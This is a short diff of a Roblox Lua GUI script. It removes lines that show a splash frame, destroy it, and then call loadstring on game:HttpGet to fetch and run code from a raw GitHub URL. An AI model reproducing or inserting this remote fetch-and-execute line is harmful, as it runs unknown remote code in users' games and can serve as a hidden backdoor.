@@ -149,7 +149,3 @@ Frame.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
 Frame.BorderSizePixel = 0
 Frame.Position = UDim2.new(0.245064691, 0, 0.0523690768, 0)
 Frame.Size = UDim2.new(0, 949, 0, 50)
-wait(4)
-ScreenGui:Destroy()
-wait(0.1)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/exhil13/RobloxIntentTest/3kdIKfmsdSf/FileKawaii.store"))()
